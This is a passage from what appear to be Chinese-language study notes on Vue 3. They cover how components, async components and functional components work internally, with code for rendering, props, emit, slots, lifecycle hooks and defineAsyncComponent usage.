更接近原生 DOM 事件，通常在需要直接操作原生 DOM 事件时使用 \n\n### 2.4. 事件修饰符支持\n\n- `@click` 支持 Vue 的所有事件修饰符，如 `.stop`、`.prevent`、`.exact` 等 \n- `:onClick` 作为属性绑定，不支持 Vue 的事件修饰符，需要在处理函数中手动处理\n\n### 2.5. 最佳实践建议\n\n- 在 Vue 应用中优先使用 `@click`，这样可以更好地利用 Vue 的事件系统\n- 如果同时使用两种方式，要注意执行顺序可能带来的影响 \n- 需要使用事件修饰符时，应该使用 `@click` \n\n### 2.6. 注意事项\n\n- 在同一个元素上同时使用这两种方式可能会导致重复触发\n- 如果需要阻止事件冒泡或默认行为，使用 `@click` 搭配事件修饰符会更加方便 \n\n### 2.7. 建议\n\n- 这种执行顺序的设计是由于浏览器的事件处理机制决定的，原生事件总是先于框架的事件处理系统执行。\n- 在实际开发中，建议选择其中一种方式而不是混用，以避免潜在的问题。","viaHZEs7":"\n# Vue3 组件的实现原理\n\n\n`#vue` `#vue3` `#vue原理` \n\n>  本文详细介绍了Vue3组件的实现原理，深入探讨了 **Vue3 组件系统的核心概念和内部机制**\n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n### 关键点\n\n- 渲染函数的特点\n\t- ① 包含 `render` 函数\n\t- ② `return` 一个 `vnode`\n- 渲染器根据 `vdom type`判断是否为组件\n\t- 并使用 `mountComponent` 或 `patchComponent` 进行挂载和更新。\n- 组件状态：\n\t- 通过`data()`保存，并使用 `reactive` 使其成为响应式数据\n\t\t- `const state = data ? reactive(data()) : null`\n\t- ==保证每个组件实例不同享==，否则就共享了\n\t- 因为响应式，所以每次 data 变更时，都会导致重新渲染，解决方案：==使用微任务队列，如下图==\n\t\t- ![图片&文件](./files/20241231.png)\n- 组件实例：\n\t- 是一个对象，==存储组件运行过程的所有信息==\n\t\t- 包括状态、props、==各类生命周期==、是否挂载\n\t\t\t- 插槽\n\t\t\t- 组件的子树\n- props 机制\n\t- 需要编写大量边界代码，并通过==渲染上下文对象==暴露数据\n\t- ==注意点==：\n\t\t- 没有在 `props 选项`中的 `props 数据`都将存储到 `attrs` 对象中\n- setup 函数：返回==两个==\n\t- 为组合式 API设计 ，可返回**渲染函数**或**数据对象**。\n- emit 函数：\n\t- 用于发射组件**自定义事件**\n\t- `v-on 指令`绑定的事件会存储在 props 对象中\n- 插槽内容：关键点是==编译==\n\t- 被编译为==插槽函数==，`<slot>`标签被编译为插槽函数的调用\n- 生命周期函数通过 `onMounted` 等方法注册，存储在组件实例的相应==数组==中\n\n### 1.3. 如何使用虚拟节点来描述组件\n\n- 使用虚拟节点的 `vnode.type` 属性来存储`组件对象类型`\n\t- 渲染器根据虚拟节点的该属性的类型来判断它是否是组件\n\t\t- 如果是组件，则渲染器会使用 `mountComponent` 和 `patchComponent` 来完成组件的`挂载和更新`。\n\n### 1.4. 组件的自更新\n\n- 在组件挂载阶段，会为组件创建一个`用于渲染其内容的副作用函数`。\n\t- 该副作用函数会与组件自身的响应式数据建立响应联系。\n\t- 当**组件自身的响应式数据发生变化时**，会触发渲染副作用函数重新执行，即`重新渲染`。\n- 但由于默认情况下`重新渲染`是同步执行的，这导致无法对任务去重，因此我们在创建渲染副作用函数时，指定了`自定义的调度器`。\n\t- 该`调度器`的作用是，当组件自身的响应式数据发生变化时，将渲染副作用函数缓冲到**微任务队列**中。\n\t- 有了缓冲队列，我们即可实现对渲染任务的去重，从而避免无用的重新渲染所导致的额外性能开销。\n\n### 1.5. `组件实例`\n\n它**本质上是一个对象**\n- 包含了组件运行过程中的状态\n- 例如组件是否挂载、组件自身的响应式数据，以及组件所渲染的内容(即 `subtree`)等。\n- 有了组件实例后，在渲染副作用函数内，我们就可以根据组件实例上的状态标识，来决定应该进行全新的挂载，还是应该打补丁。\n\n### 1.6. 组件的 props 与组件的被动更新\n\n- 副作用自更新所引起的子组件更新叫作子组件的被动更新\n\n### 1.7. 渲染上下文(renderContext)\n\n它实际上是==组件实例的代理对象==\n- 在渲染函数内访问组件实例所暴露的数据都是通过该代理对象实现的\n\n### 1.8. setup 函数\n\n 该函数是为了组合式 API 而生 的，所以我们要避免将其与 Vue.js 2 中的“传统”组件选项混合使用。\n  setup 函数的返回值可以是**两种类型**，\n  - 如果返回`函数`，则将该函数作为组件的渲染函数;\n  - 如果返回`数据对象`，则将该对象暴露到`渲染上下文中`。\n\n### 1.9. emit 函数\n\n- `emit 函数`包含在 `setupContext 对象`中，可以通过 `emit 函数`发射组件的自定义事件。\n- 通过 `v-on 指令`为组件绑定的事件在经过`编译`后，会以 `onXxxx` 的形式存储到 `props 对象`中。\n- 当 emit 函数执行 时，会在 **props 对象中寻找对应的事件处理函数并执行它**。\n\t- 所以组件的自定义事件，不支持冒泡！！！！\n\n### 1.10. 组件的插槽\n\n- 它借鉴了 Web Component 中 `<slot>` 标签的概念\n- 插槽内容\n\t- 会被`编译`为插槽函数，==插槽函数的返回值就是向槽位填充的内容==\n- `<slot>` 标签\n\t- 会被==编译==为`插槽函数`的调用，通过执行对应的插槽函数，得到外部向槽位填充的内容(即虚拟 DOM)，最后将该内容渲染到槽位中\n\n### 1.11. 生命周期钩子函数\n\n- 比如 `onMounted` ，通过 `onMounted` 注册的生命周期函数会被注册到当前组件实例的 `instance.mounted 数组`中\n- 为了维护==当前正在初始化的组件实例==\n\t- 我们定义了==全局变量== `currentInstance`，以及用来设置该变量的 `setCurrentInstance` 函数。\n\n## 2. 渲染器、组件与 vdom 之间的关系\n\n前文 [12. Vue3 渲染器的原理和实现](/post/yfbT1DXt.html) 实现了对单个 `vdom` 的渲染，比如对下面 `vdom` 的渲染：\n\n```js\nconst Fragment = Symbol()\nconst newVnode = {\n  type: 'div',\n  children: [\n    {\n      type: Fragment,\n      children: [\n        { type: 'p', children: 'text 1' },\n        { type: 'p', children: 'text 2' },\n        { type: 'p', children: 'text 3' }\n      ]\n    },\n    { type: 'section', children: '分割线' }\n  ]\n}\n```\n\n但实际页面，会包括很多 `vdom` 甚至是各种嵌套的 `vdom`\n\n那么，**如何使用** `vdom` **来描述页面，描述 UI 呢？**\n\n这里直接给出答案：如下结构\n\n```js hl:2\nconst C1 = {\n    name: 'C1',\n    type: 'C1',\n    render() {\n        return {\n            type: 'div',\n            children: [\n                { type: 'p', children: 'text 1' },\n                { type: 'p', children: 'text 2' },\n                { type: 'p', children: 'text 3' }\n            ]\n        }\n    }\n}\n```\n\n两个要点：\n\n- ① 包含 `render` 函数\n- ② `return` 一个 `vnode`\n\n下图展示了 `渲染器、组件 、 vnode 的关系` , **很重要，打开看看**\n- [figjam](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=201-996&t=x2AAJuGlw9iHBGmM-4)\n\n- 总结下就是，渲染器会根据 `vdom` 的类型\n\t- 是字符串\n\t- 是文本类型（Symbol）\n\t- 是 Fragment\n\t- 是对象 或者 函数\n\t\t- 来判断它是否是否是`组件`\n\t\t\t- 如果是，则会继续递归使用 `mountComponent` 或者 `patchComponent`来完成组件的挂载和更新\n\t\t\t\t- 比如 ：\n\t\t\t\t\t- ![图片&文件](./files/20241104.png)\n\t\t\t\t- 比如：\n\t\t\t\t\t- ![图片&文件](./files/20241104-1.png)\n- 部分代码如下：\n\n```js\nif (typeof type === 'string') {\n    if (!n1) {\n        mountElement(n2, container, anchor)\n    } else {\n        patchElement(n1, n2)\n    }\n} else if (type === Text) {\n    if (!n1) {\n        const el = n2.el = createText(n2.children)\n        insert(el, container)\n    } else {\n        const el = n2.el = n1.el\n        if (n2.children !== n1.children) {\n            setText(el, n2.children)\n        }\n    }\n} else if (type === Fragment) {\n    if (!n1) {\n        n2.children.forEach(c => patch(null, c, container))\n    } else {\n        patchChildren(n1, n2, container)\n    }\n} else if (typeof type === 'object' || typeof type === 'function') {\n    // 挂载组件\n    if (!n1) {\n        mountComponent(n2, container, anchor)\n    } else { // 更新组件\n        patchComponent(n1, n2, anchor)\n    }\n}\n```\n\n所以这里总结下主要的函数：\n- mountElement\n- patchElement\n- patchChildren\n- mountComponent\n\n挂载与更新组件，对应不同的生命周期，如下图\n\n![图片&文件](./files/20241104-2.png)\n\n## 3. 如何保存组件状态，以及状态改变了同步更新组件\n\n如果保存组件状态呢？\n- 答案是 `data()` ，并且需要让 `data 数据`是响应式的，所以代码应该如下\n\n```js\nconst state = data ? reactive(data()) : null\n```\n\n所以，每次更新 data ，会重新渲染\n\n![图片&文件](./files/20241104-3.png)\n\n但是浏览器渲染是`同步任务`，所以需要有个**调度器**来调度，它通过`promise` 实现了一个`微任务队列`，避免重复渲染，去重任务队列等。\n\n> 关于**调度器微任务队列**的实现，更多参考 [9. Vue3 中 effect 的调度选项（scheduler）使用示例](/post/bZBkBVeg.html)\n\n部分代码如下：注意下面的 `scheduler`\n\n```js\n const state = data ? reactive(data()) : null\n effect(() => {\n    const subTree = render.call(renderContext, renderContext)\n}, {\n    scheduler: queueJob\n})\n```\n\n**queueJob** 的代码如下：\n\n![图片&文件](./files/20241104-4.png)\n\n## 4. 组件实例与组件的生命周期\n\n- **组件实例**，本质就是一个对象，**存储着组件运行过程的所有信息**，比如\n\t- 组件状态\n\t- 是否卸载\n\t- 组件的子树\n\t- 插槽\n\t- 生命周期等\n- 如下代码：\n\n```js\nconst instance = {\n        state, //  组件自身的状态数据，即 data。\n        props: shallowReactive(props),\n        isMounted: false, //  一个布尔值，用来表示组件是否被挂载\n        subTree: null,\n        slots,\n        mounted: [] // 钩子函数数组\n}\n```\n\n各类生命周期，就在具体位置上添加即可，如下：\n\n![|632](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101223326.png)\n\n一个组件可能存在多个同类型的组件，比如 `mixin` 进来的组件，这时候就需要数组了。但核心原理不变\n\n> 我们通常把生命周期钩子序列化一个数组\n\n![图片&文件](./files/20241104-5.png)\n\n## 5. props 与组件的被动更新\n\n- `副作用自更新`所引起的子组件更新叫作`子组件的被动更新`。\n- 我们需要检查是否需要真的更新\n\t- 比如 `props` 如果根本就没变？\n\t- 如果需要更新，需要同步更新子组件的 `props` 、`slots` 等内容\n\t- 其实要 **完善 vue 中的 props 机制，需要编写大量的边界代码**\n\n由于 props 数据与组件自身的状态数据都需要暴露到`渲染函数`中，并使得渲染函数能够通过 this 访问它们，因此我们需要封装一个`渲染上下文对象（renderContext）`， \n- 它实际上是组件实例的代理对象。**在渲染函数内访问组件实例所暴露的数据都是通过该代理对象实现的**。\n- `renderContext` 它的意义在于拦截数据状态的读取和设置操作，每当在渲染函数或生命周期钩子中通过 `this` 来读取数据时，都会优先从组件的自身状态中读取，如果组件本身并没有对应的数据， 则再从 props 数据中读取。\n- 最后我们将渲染上下文作为渲染函数以及生命周期钩子的 `this` 值即可\n- vue 中，没有在 `props 选项`中的 `props 数据`都将存储到 `attrs` 对象中\n\t- 两个对象：\n\t\t- props 对象 和 attrs 对象\n\n下面是 `patchComponent` 的逻辑\n\n```javascript hl:4,6\nfunction patchComponent(n1, n2, anchor) {\n\tconst instance = (n2.component = n1.component);\n\tconst { props } = instance;\n\tif (hasPropsChanged(n1.props, n2.props)) {\n\t\t// 调用 resolveProps 函数重新获取 props 数据\n\t\tconst [nextProps, nextAttrs] = resolveProps(\n\t\t\tn2.type.props,\n\t\t\tn2.props,\n\t\t);\n\t\t// 更新 props\n\t\tfor (const k in nextProps) {\n\t\t\tprops[k] = nextProps[k];\n\t\t}\n\t\t// 删除不存在的 props\n\t\tfor (const k in props) {\n\t\t\tif (!(k in nextProps)) delete props[k];\n\t\t}\n\t}\n}\n\nfunction hasPropsChanged(prevProps, nextProps) {\n\tconst nextKeys = Object.keys(nextProps);\n\tif (nextKeys.length !== Object.keys(prevProps).length) {\n\t\treturn true;\n\t}\n\tfor (let i = 0; i < nextKeys.length; i++) {\n\t\tconst key = nextKeys[i];\n\t\treturn nextProps[key] !== prevProps[key];\n\t}\n\treturn false;\n}\n\nfunction resolveProps(options, propsData) {\n\tconst props = {};\n\tconst attrs = {};\n\tfor (const key in propsData) {\n\t\tif ((options && key in options) || key.startsWith(\"on\")) {\n\t\t\tprops[key] = propsData[key];\n\t\t} else {\n\t\t\tattrs[key] = propsData[key];\n\t\t}\n\t}\n\n\treturn [props, attrs];\n}\n```\n\n## 6. setup 函数的作用 与 实现\n\n`setup` 函数，它只会在挂载时`执行一次`，该函数是为了`组合式 API` 而生的，==所以我们要避免将其与 `Vue.js 2 中的“传统”组件选项（如 methods watch data）` 混合使用。==\n\n`setup` 函数的返回值可以是**两种类型**\n- 如果返回`函数`，则**将该函数作为组件的渲染函数**；\n- 如果返回`数据对象`，则将该对象暴露到`渲染上下文`中，暴露给模板使用。\n\n```js hl:11,15\nconst InnerComp = {\n    name: 'InnerComp',\n    /**\n     * expose: 暴露给父组件的属性\n     * */\n    setup(props, {emit, slots,attrs,expose}) {\n\t\t// setupContext 中包含与组件接口相关的重要数据\n\t\t// const { slots, emit, attrs, expose } = setupContext\n        \n        const count = ref(0);\n        // 返回一个【数据对象】\n        return {\n            count,\n        }\n        // 返回一个【渲染函数】\n        return () => ({\n            type: 'span',\n            children: 'inner'\n        })\n    }\n}\n```\n\n## 7. 组件事件与 emit\n\n- emit 函数包含在 `setupContext 对象`中，可以通过 `emit 函数` 发射组件的自定义事件。\n- 通过 `v-on` 指令为组件绑定的事件在经过`编译`后，会以 `onXxx` 的形式存储到 `props 对象`中。\n- 当 `emit` 函数执行时，会在 **props 对象中寻找对应的事件处理函数**并执行它。\n\n```javascript hl:3\nfunction emit(event, ...payload) {\n\t\tconst eventName = `on${event[0].toUpperCase() + event.slice(1)}`;\n\t\t// 从当前组件实例上获取事件处理函数\n\t\tconst handler = instance.props[eventName];\n\t\tif (handler) {\n\t\t\thandler(...payload);\n\t\t} else {\n\t\t\tconsole.error(\"事件不存在\");\n\t\t}\n}\n```\n\n## 8. 插槽 slot\n\n它借鉴了 Web Component 中 `<slot> 标签`的概念。\n- **插槽内容会被编译为插槽函数，插槽函数的返回值就是向槽位填充的内容**。\n- `<slot>` 标签则会被编译为插槽函数 的调用，通过执行对应的**插槽函数**，得到外部向槽位填充的内容（即虚拟 DOM），最后将该内容渲染到`槽位`中。\n\n我们以 `MyComponent` 组件为例，它的模板如下：\n\n![|376](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101327730.png)\n\n上面的代码会**编译**成如下：\n\n![|328](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101329712.png)\n\n具体使用 `MyComponent` 组件\n\n![|208](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101327662.png)\n\n上面的模板，会编译成如下`渲染函数`：\n\n![|512](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101328116.png)\n\n比如 `this.$slots.header()` ，在 `renderContext 代理对象`中获取，如下：\n\n![图片&文件](./files/20241104-6.png)\n\n**插槽的实现是不是和 React render props 的概念很像？**，如下图：\n\n![|384](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101333060.png)\n\n## 9. 注册生命周期\n\n先看代码，下面注册两个 `onMounted` ，它会被放到一个数组中\n\n![|424](https://od-1310531898.cos.ap-beijing.myqcloud.com/202306101337074.png)\n\n- 通过 `onMounted` 注册的生命周期函数会被注册到**当前组件实例**的**instance.mounted 数组**中。\n- 为了维护当前正在初始化的**组件实例**，\n\t- 我们定义了`全局变量currentinstance`，以及用来设置该变量的 `setCurrentInstance` 函数\n- 其他生命周期同理\n\n![图片&文件](./files/20241104-7.png)\n\n### 9.1. 如何 push 的\n\n![图片&文件](./files/20241104-10.png)\n\n### 9.2. 如何执行的\n\n![图片&文件](./files/20241104-9.png)\n\n## 10. 最后\n\n一些具体代码实现细节，没有太抠，知道大致的原理即可，真有应用场景再仔细研究一下具体代码实现细节。\n\n>  对于低代码的实现，很有==借鉴意义==\n\n## 11. 参考\n\n- 《Vue 设计与实现》","yD1Ns7e7":"\n# 异步组件和函数式组件的实现原理\n\n`#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 使用 `defineAsyncComponent` 定义异步组件\n\t- loader → import \n\t- loadingComponent\n\t- errorComponent\n\t- onError\n\t\t- retry\n\t- 等等\n- 异步组件使用场景\n\t- 页面性能、代码分割、服务端下发组件等场景\n- 异步组件默认是\"挂起的\"，需要配合 `Suspense 组件`使用才能显示加载状态\n- 在服务器端渲染（SSR）中使用时需要特别注意，确保组件能够正确地在服务器端渲染\n- 异步组件最好用于`较大的组件`或不是`立即需要的组件`\n- Vue 3.5 新特性 - ==水合控制时机==\n\t- 当指定的==媒体查询==匹配时进行激活\n\t- ==交互时==激活\n\t- 仅在==元素可见时==开始加载，且在元素进入视口100px之前开始加载\n- 配合 `is` 使用：\n\t- `<component is = \"AsyncCmpt\">` \n- 一个函数式组件\n\t- **本质上**就是一个==普通函数==，该函数的**返回值**是`虚拟 DOM` \n\t- 函数式组件**没有自身状态** ，需要通过 `props` 的方式传入\n- Loading 组件组件 与 delay 选项\n\t- 说说==避免闪烁的原理==？ →  之前理解有误\n\n## 2. 异步组件的概念\n\n即，以异步的方式加载并渲染一个组件。 这在`页面性能` 、 `代码分割`、`服务端下发组件`等场景中尤为重要\n\n## 3. 先看定义和使用指南\n\n### 3.1. 定义 defineAsyncComponent \n\n```ts\nfunction defineAsyncComponent(\n  source: AsyncComponentLoader | AsyncComponentOptions\n): Component\n\ntype AsyncComponentLoader = () => Promise<Component>\n\ninterface AsyncComponentOptions {\n  loader: AsyncComponentLoader\n  loadingComponent?: Component\n  errorComponent?: Component\n  delay?: number\n  timeout?: number\n  suspensible?: boolean\n  onError?: (\n    error: Error,\n    retry: () => void,\n    fail: () => void,\n    attempts: number\n  ) => any\n}\n\nimport { defineAsyncComponent } from 'vue'\n\nconst AsyncComp = defineAsyncComponent(() => {\n  return new Promise((resolve, reject) => {\n    // ...从服务器获取组件\n    resolve(/* 获取到的组件 */)\n  })\n  // or\n  return import('./components/MyComponent.vue')\n})\n// ... 像使用其他一般组件一样使用 `AsyncComp`\n```\n\n### 3.2. 使用示例\n\n#### 3.2.1. 最基础的用法\n\n```js\nimport { defineAsyncComponent } from 'vue'\n\n// 异步加载组件\nconst AsyncComponent = defineAsyncComponent(() =>\n  import('./components/MyComponent.vue')\n)\n\n// 在组件中使用\nexport default {\n  components: {\n    AsyncComponent\n  }\n}\n```\n\n#### 3.2.2. 带加载和错误状态的完整配置\n\n```js\nconst AsyncComponent = defineAsyncComponent({\n  // 加载函数\n  loader: () => import('./components/MyComponent.vue'),\n  \n  // 加载时显示的组件\n  loadingComponent: LoadingSpinner,\n  \n  // 展示加载组件前的延迟时间，默认为 200ms\n  delay: 200,\n  \n  // 错误时显示的组件\n  errorComponent: ErrorComponent,\n  \n  // 如果提供了 timeout，并且加载时间超过了设定值，将显示错误组件\n  timeout: 3000,\n  \n  // 加载失败时的回调\n  onError(error, retry, fail, attempts) {\n    if (attempts <= 3) {\n      // 重试\n      retry()\n    } else {\n      // 失败\n      fail()\n    }\n  }\n})\n```\n\n#### 3.2.3. 在 setup 函数中使用\n\n```js\nimport { defineAsyncComponent } from 'vue'\n\nexport default {\n  setup() {\n    const DynamicComponent = defineAsyncComponent(() =>\n      import(`./components/${someCondition ? 'A' : 'B'}.vue`)\n    )\n\n    return {\n      DynamicComponent\n    }\n  }\n}\n```\n\n#### 3.2.4. 结合 Suspense 使用\n\n```vue\n<template>\n  <Suspense>\n    <template `#default>`\n      <AsyncComponent />\n    </template>\n    <template `#fallback>`\n      <div>Loading...</div>\n    </template>\n  </Suspense>\n</template>\n\n<script>\nimport { defineAsyncComponent } from 'vue'\n\nexport default {\n  components: {\n    AsyncComponent: defineAsyncComponent(() =>\n      import('./components/HeavyComponent.vue')\n    )\n  }\n}\n</script>\n```\n\n#### 3.2.5. 处理动态路径的组件\n\n```js\nconst AsyncComponent = defineAsyncComponent({\n  loader: () => {\n    const componentName = computed(() => store.state.currentComponent)\n    return import(`./components/${componentName.value}.vue`)\n  },\n  loadingComponent: LoadingComponent,\n  errorComponent: ErrorComponent\n})\n```\n\n#### 3.2.6. 带有缓存的异步组件\n\n```js\nconst cache = new Map()\n\nconst AsyncComponent = defineAsyncComponent({\n  loader: async () => {\n    const componentPath = './components/MyComponent.vue'\n    \n    if (!cache.has(componentPath)) {\n      const component = await import(componentPath)\n      cache.set(componentPath, component)\n    }\n    \n    return cache.get(componentPath)\n  }\n})\n```\n\n#### 3.2.7. 配合路由\n\n```javascript\n// 路由中使用\nimport { createRouter } from 'vue-router'\n\nconst router = createRouter({\n  routes: [\n    {\n      path: '/dashboard',\n      component: defineAsyncComponent(() => \n        import('./views/Dashboard.vue')\n      )\n    }\n  ]\n})\n```\n\n### 3.3. Vue 3.5 新特性 - 水合控制\n\n在 Vue 3.5+ 中，异步组件可以通过提供`激活策略`来控制何时进行激活\n\n```javascript hl:13,15,17\nimport {\n    defineAsyncComponent,\n    hydrateOnIdle,\n    hydrateOnVisible,\n    hydrateOnInteraction,\n    hydrateOnMediaQuery,\n} from \"vue\";\n\nconst AsyncComp = defineAsyncComponent({\n    loader: () => import(\"./Comp.vue\"),\n    hydrate: hydrateOnIdle(/* 传递可选的最大超时 */),\n    hydrate: hydrateOnVisible(), // 仅在元素可见时开始加载\n    // 仅在元素可见时开始加载，且在元素进入视口100px之前开始加载\n    hydrate: hydrateOnVisible({ rootMargin: \"100px\" }),\n    //当指定的媒体查询匹配时进行激活。\n    hydrate: hydrateOnMediaQuery(\"(max-width:500px)\"),\n    // 交互时激活\n    hydrate: hydrateOnInteraction(\"click\"),\n});\n```\n\n### 3.4. 需要注意的是\n\n- `defineAsyncComponent` 返回的是一个**高阶组件**，它仅在需要时才会加载实际的组件\n- 异步组件默认是\"挂起的\"，需要配合 `Suspense 组件`使用才能显示加载状态\n- 在服务器端渲染（SSR）中使用时需要特别注意，确保组件能够正确地在服务器端渲染\n- 异步组件最好用于`较大的组件`或不是`立即需要的组件`\n\n## 4. 异步组件的简易实现\n\n同步渲染，如下面的代码就是同步渲染的\n\n![|299](https://832-1310531898.cos.ap-beijing.myqcloud.com/473c17f0834312fab0708e76ce7ba693.png)\n\n最简单的`异步组`件加载渲染实现：使用 `import()` \n\n![|390](https://832-1310531898.cos.ap-beijing.myqcloud.com/c67ad6727edfee99008493c10f669896.png)\n\n### 4.1. 只异步渲染页面的某一部分\n\n![|440](https://832-1310531898.cos.ap-beijing.myqcloud.com/9397a82c38cdd035e996cffb175114ca.png)\n\n> 关于 `is`，是`vue`内置的特殊 **Attributes** （其他的如 `key` 和 `ref`）, 用于**绑定动态组件**。 更多参考 [https://cn.vuejs.org/api/built-in-special-attributes.html#is](https://cn.vuejs.org/api/built-in-special-attributes.html#is)\n\n> 关于 `is`参考 [4. Vue3 中 is 属性的使用方法和应用场景](/post/OZt8zyjK.html)\n> 关于 `import` 参考，[32. vite 之 import 关键词](/post/VRabtZlK.html)\n\n### 4.2. 待完善的点\n\n- 如果组件加载失败或加载超时，是否要渲染 ==Error 组件==？\n- 组件在加载时，是否要展示==占位==的内容？例如渲染一个 `Loading` 组件。\n- 组件加载的速度可能很快，也可能很慢，是否要设置一个延迟展示 Loading 组件的时间？\n\t- ==如果组件在 200ms 内没有加载成功才展示 Loading 组件==，这样可以避免由组件加载过快所导致的`闪烁`。 \n- 组件加载失败后，是否需要==重试==？\n\n> [!abstract]\n从根本上来说，异步组件的实现可以完全在**用户层面**实现，而无须框架支持。但一个完善的异步组件仍需要考虑诸多问题\n\n## 5. 异步组件的实现原理\n\n异步组件**本质上**是通过封装手段来实现友好的用户接口，从而降低**用户层面**的使用复杂度\n\n### 5.1. 封装 defineAsyncComponent 函数\n\n`defineAsyncComponent` 的`本质`是一个高阶组件，返回一个`包装组件`\n\n![图片&文件](./files/20241104-11.png)\n\n### 5.2. 一个 Loading 的场景的优化\n\n> [!question]\n如果加载需要 `201ms` , `delay = 200` , 那么 loading 组件就展示 `1ms` ？\n\n这个解决方案的核心思路是：\n1. 设置 `delay`（`延迟显示时间`）：在短时间加载完成的情况下，完全不显示 loading\n2. 设置 `minDuration`（最小显示时间）：**一旦显示了 loading，确保它至少显示一定时间**\n\n这样可以避免两种情况：\n- 对于特别快的加载（< delay），完全不显示 loading \n- 对于接近 delay 的加载，确保 loading 显示足够长的时间，避免闪烁\n在上面的例子中：\n- 如果加载时间 < 200ms，完全不会显示 loading\n- 如果加载时间 > 200ms，loading 会显示至少 300ms\n\n上面提的问题，还是会导致`闪烁` ，所以应该再加一个参数，标识至少展示 `loading` 多久 ，所以参数应该如下：\n\n![|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/6970da42cc493c33ab00c2cba8ae11f2.png)\n>  具体代码参考： [https://github.com/yued-fe/fetch-with-loading/blob/main/fetch-with-loading.js](https://github.com/yued-fe/fetch-with-loading/blob/main/fetch-with-loading.js)\n\n#### 5.2.1. 其他思路\n\n- 考虑使用骨架屏（Skeleton）代替传统的 loading\n- 使用 CSS 过渡动画\n\n### 5.3. 重试机制\n\n![图片&文件](./files/20241104-12.png)\n\n#### 5.3.1. 延伸\n\n如何重现发起请求，并控制次数\n\n```javascript hl:7\nPromise.retry = function (fn, times = 3) {\n    return new Promise(async (resolve, reject) => {\n        while (times--) {\n            try {\n                let ret = await fn();\n                resolve(ret);\n                // 如果成功了，就直接break了\n                break;\n            } catch (error) {\n                if (!times) reject(error);\n            }\n        }\n    });\n};\n```\n\n> [!tip]\n `while` 里直接使用 `break` 跳出循环，平时使用相对少\n\n## 6. 函数式组件 与 有状态的组件\n\n一个函数式组件**本质上**就是一个普通函数，该函数的**返回值**是`虚拟 DOM` ， \n- 函数式组件**没有自身状态** ，需要通过 `props` 的方式传入。\n\n下面是一个 函数式组件的示例：\n\n```javascript\nfunction MyFuncComp(props) {\n    return {type: 'h1', children: props.title}\n}\n\nMyFuncComp.props = {\n    title: 'default title'\n}\n```\n\n函数式组件**无需初始化**`data`**以及生命周期钩子**。\n- 从这一点可以看出，函数式组件的初始化性能消耗**小于有状态组件**\n- 但其实在 Vue.js 3 中，即使是**有状态组件**，其**初始化性能消耗也非常小**，\n\n下面是一个具体的代码实现：\n\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/cab8607e5c66d804ed355f4e98c49910.png)\n\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/f0f7b9f6f2f48546166404f6484dd6e4.png)\n\n![|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/c20cc1744e847ad5027143ba2dcfedba.png)\n\n## 7. 总结\n\n- 异步组件在页面性能、拆包以及服务端下发组件等场景中尤为重要。\n- 从根本上来说，异步组件的实现可以完全在`用户层面`实现，而`无须框架支持`。\n- 但一个完善的异步组件仍需要考虑诸多问题，例如: \n\t- 允许用户指定加载出错时要渲染的组件;  \n\t- 允许用户指定 Loading 组件，以及展示该组件的`延迟`时间; \n\t\t- ==注意：这是延迟展示 Loading 的时间==\n\t- 允许用户设置加载组件的`超时`时长\n\t- 组件加载失败时，为用户提供重试的能力。\n\t- 因此，框架有必要内建异步组件的实现。\n- Vue.js 3 提供了 `defineAsyncComponent` 函数，用来定义`异步组件`\n\t- 异步组件的加载超时问题，以及当加载错误发生时，如何指定 Error 组件\n\t- 通过为 `defineAsyncComponent` 函数指定选项参数，允许用户通过 timeout 选项设置超时时长。\n\t- 当加载超时后，会触发加载错误，这时会渲染用户通过 errorComponent 选 项指定的 Error 组件。\n- Loading 组件组件 与 delay 选项\n\t- 为了避免 Loading 组件导致的闪烁问题，我们还需要设计一个接口，让用户能指定==延迟展示 Loading 组件==的时间，即 delay 选项。\n- 组件加载发生错误后的重试机制\n- 我们讨论了==函数式组件==。它本质上是一个函数，其内部实现逻辑可以复用有状态组件的实现逻辑。\n\t- 为了给函数式组件**定义 props**，我们允许开发者在函数式组件的主函数上添加**静态的 props 属性**。\n\t- 出于更加严谨的考虑，函数式组件没有自身状态，也没有生命周期的概念。\n\t- 所以，在初始化函数式组件时，需要选择性地复用有状态组件的**初始化逻辑**。\n\n## 8. 参考\n\n《vue.js 设计与实现》\n","OrbjMzvM":"\n# Vue3 异步组件的使用\n\n`#vue` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 异步组件的==优势==\n\t- 有效地进行代码分割，提高应用的性能和用户体验\n- 要使用 `Suspense` 来包裹异步组件 → 确保应用的稳定性\n\t- 内置错误处理机制\n\t- 重试机制\n- 使用 `defineAsyncComponent` 来==配置==异步组件\n\t- 有很多==参数==，比如\n\t\t- 加载中组件\n\t\t- 加载错误组件\n\t\t- 超时等等\n- 直接使用 `import` 来引入`异步组件`\n\t- ==路由==级别\n\t- 全局异步组件==注册==\n\t- 可带==缓存==\n- 错误处理\n\t- 可==自定义==重试机制\n\t- app.handleError \n\t- 组件级别错误 onErrorCaptured \n\n## 2. 基础异步组件定义\n\n### 2.1. 使用 defineAsyncComponent\n\n```vue\n<template>\n  <div>\n    <Suspense>\n      <template `#default>`\n        <AsyncComp />\n      </template>\n      <template `#fallback>`\n        <div>加载中...</div>\n      </template>\n    </Suspense>\n  </div>\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\n// 基础异步组件定义\nconst AsyncComp = defineAsyncComponent(() => \n  import('./components/HeavyComponent.vue')\n)\n</script>\n```\n\n### 2.2. 带配置的异步组件\n\n```vue\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\nconst AsyncComp = defineAsyncComponent({\n  loader: () => import('./components/HeavyComponent.vue'),\n  loadingComponent: LoadingComponent, // 加载中组件\n  errorComponent: ErrorComponent,     // 错误时组件\n  delay: 200,                        // 展示加载组件的延迟时间\n  timeout: 3000,                     // 超时时间\n  suspensible: true,                 // 是否可挂起\n  onError(error, retry, fail) {      // 错误处理\n    if 